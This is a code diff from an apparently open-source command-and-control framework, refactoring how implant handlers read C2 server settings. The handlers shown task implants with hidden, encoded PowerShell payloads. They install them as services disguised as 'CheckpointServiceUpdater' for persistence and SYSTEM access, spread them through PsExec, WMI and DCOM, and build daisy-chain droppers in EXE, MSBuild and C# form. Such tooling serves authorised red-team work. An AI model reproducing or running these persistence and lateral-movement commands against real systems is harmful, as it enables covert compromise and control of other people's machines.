@@ -221,13 +221,11 @@ def do_download_files(user, command, randomuri):
 
 def do_install_servicelevel_persistencewithproxy(user, command, randomuri):
     C2 = get_c2server_all()
-    if C2[11] == "":
+    if C2.ProxyURL == "":
         print_bad("Need to run createproxypayload first")
         return
     else:
-        newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12],
-                              C2[13], C2[11], "", "", C2[17], C2[18],
-                              C2[19], "%s?p" % get_newimplanturl(), PayloadsDirectory)
+        newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent, C2.Referrer, "%s?p" % get_newimplanturl(), PayloadsDirectory)
         payload = newPayload.CreateRawBase()
         cmd = "sc.exe create CPUpdater binpath= 'cmd /c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s' Displayname= CheckpointServiceUpdater start= auto" % (payload)
         new_task(cmd, user, randomuri)
@@ -235,9 +233,7 @@ def do_install_servicelevel_persistencewithproxy(user, command, randomuri):
 
 def do_install_servicelevel_persistence(user, command, randomuri):
     C2 = get_c2server_all()
-    newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], "",
-                          "", "", "", "", C2[17], C2[18],
-                          C2[19], get_newimplanturl(), PayloadsDirectory)
+    newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent, C2.Referrer, get_newimplanturl(), PayloadsDirectory)
     payload = newPayload.CreateRawBase()
     cmd = "sc.exe create CPUpdater binpath= 'cmd /c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s' Displayname= CheckpointServiceUpdater start= auto" % (payload)
     new_task(cmd, user, randomuri)
@@ -253,13 +249,11 @@ def do_get_implantworkingdirectory(user, command, randomuri):
 
 def do_get_system_withproxy(user, command, randomuri):
     C2 = get_c2server_all()
-    if C2[11] == "":
+    if C2.ProxyURL == "":
         print_bad("Need to run createproxypayload first")
         return
     else:
-        newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12],
-                              C2[13], C2[11], "", "", C2[17], C2[18],
-                              C2[19], "%s?p" % get_newimplanturl(), PayloadsDirectory)
+        newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent, C2.Referrer, "%s?p" % get_newimplanturl(), PayloadsDirectory)
         payload = newPayload.CreateRawBase()
         cmd = "sc.exe create CPUpdaterMisc binpath= 'cmd /c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s' Displayname= CheckpointServiceModule start= auto" % payload
         new_task(cmd, user, randomuri)
@@ -284,9 +278,7 @@ def do_get_system_withdaisy(user, command, randomuri):
 
 def do_get_system(user, command, randomuri):
     C2 = get_c2server_all()
-    newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], "",
-                          "", "", "", "", C2[17], C2[18],
-                          C2[19], get_newimplanturl(), PayloadsDirectory)
+    newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent, C2.Referrer, get_newimplanturl(), PayloadsDirectory)
     payload = newPayload.CreateRawBase()
     cmd = "sc.exe create CPUpdaterMisc binpath= 'cmd /c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s' Displayname= CheckpointServiceModule start= auto" % payload
     new_task(cmd, user, randomuri)
@@ -344,9 +336,7 @@ def do_invoke_psexecdaisypayload(user, command, randomuri):
 def do_invoke_psexecpayload(user, command, randomuri):
     check_module_loaded("Invoke-PsExec.ps1", randomuri, user)
     C2 = get_c2server_all()
-    newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], "",
-                          "", "", "", "", C2[17], C2[18],
-                          C2[19], get_newimplanturl(), PayloadsDirectory)
+    newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent, C2.Referrer, get_newimplanturl(), PayloadsDirectory)
     payload = newPayload.CreateRawBase()
     params = re.compile("invoke-psexecpayload ", re.IGNORECASE)
     params = params.sub("", command)
@@ -377,7 +367,7 @@ def do_invoke_wmijspbindpayload(user, command, randomuri):
     C2 = get_c2server_all()
     print()
     print("To connect to the SMB named pipe use the following command:")
-    print(Colours.GREEN + "invoke-pbind -target %s -secret mtkn4 -key %s -pname jaccdpqnvbrrxlaf -client" % (target[0], C2[2]) + Colours.END)
+    print(Colours.GREEN + "invoke-pbind -target %s -secret mtkn4 -key %s -pname jaccdpqnvbrrxlaf -client" % (target[0], C2.EncKey) + Colours.END)
     print()
     print("To issue commands to the SMB named pipe use the following command:")
     print(Colours.GREEN + "pbind-command \"pwd\"" + Colours.END)
@@ -469,9 +459,7 @@ def do_invoke_wmidaisypayload(user, command, randomuri):
 def do_invoke_wmipayload(user, command, randomuri):
     check_module_loaded("Invoke-WMIExec.ps1", randomuri, user)
     C2 = get_c2server_all()
-    newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], "",
-                          "", "", "", "", C2[17], C2[18],
-                          C2[19], get_newimplanturl(), PayloadsDirectory)
+    newPayload = Payloads(C2.KillDate, C2.EncKey,  C2.Insecure, C2.UserAgent, C2.Referrer, get_newimplanturl(), PayloadsDirectory)
     payload = newPayload.CreateRawBase()
     params = re.compile("invoke-wmipayload ", re.IGNORECASE)
     params = params.sub("", command)
@@ -511,9 +499,7 @@ def do_invoke_dcomdaisypayload(user, command, randomuri):
 
 def do_invoke_dcompayload(user, command, randomuri):
     C2 = get_c2server_all()
-    newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], "",
-                          "", "", "", "", C2[17], C2[18],
-                          C2[19], get_newimplanturl(), PayloadsDirectory)
+    newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent, C2.Referrer, get_newimplanturl(), PayloadsDirectory)
     payload = newPayload.CreateRawBase()
     p = re.compile(r'(?<=-target.).*')
     target = re.search(p, command).group()
@@ -552,13 +538,12 @@ def do_invoke_runasdaisypayload(user, command, randomuri):
 @creds(accept_hashes=False)
 def do_invoke_runasproxypayload(user, command, randomuri):
     C2 = get_c2server_all()
-    if C2[11] == "":
+    if C2.ProxyURL == "":
         print_bad("Need to run createproxypayload first")
         return
     else:
-        newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12],
-                              C2[13], C2[11], "", "", C2[17], C2[18],
-                              C2[19], "%s?p" % get_newimplanturl(), PayloadsDirectory)
+        newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent,
+                              C2.Referrer, "%s?p" % get_newimplanturl(), PayloadsDirectory)
         payload = newPayload.CreateRawBase()
         proxyvar = "$proxypayload = \"powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\"" % payload
         new_task(proxyvar, user, randomuri)
@@ -875,8 +860,8 @@ def do_startdaisy(user, command, randomuri):
         daisyhost = get_implantdetails(randomuri)
         proxynone = "if (!$proxyurl){$wc.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()}"
         C2 = get_c2server_all()
-        newPayload = Payloads(C2[5], C2[2], f"http://{bind_ip}", "", f"{bind_port}", "", "", "",
-                                "", proxynone, C2[17], C2[18], C2[19], "%s?d" % get_newimplanturl(), PayloadsDirectory)
+        urlId = new_urldetails(name, C2.PayloadCommsHost, C2.DomainFrontHeader, f"Daisy: {name}", upstream_url, daisyhost[0], "")
+        newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent, C2.Referrer, "%s?d" % get_newimplanturl(), PayloadsDirectory, URLID = urlId, PowerShellProxyCommand=proxynone)
         newPayload.PSDropper = (newPayload.PSDropper).replace("$pid;%s" % (upstream_url), "$pid;%s@%s" % (daisyhost[11], daisyhost[3]))
         newPayload.CreateDroppers(name)
         newPayload.CreateRaw(name)
@@ -885,7 +870,6 @@ def do_startdaisy(user, command, randomuri):
         newPayload.CreateEXE(name)
         newPayload.CreateMsbuild(name)
         newPayload.CreateCS(name)
-        new_urldetails(name, C2[1], C2[3], f"Daisy: {name}", upstream_url, daisyhost[0], "")
         print_good("Created new %s daisy payloads" % name)
 
 
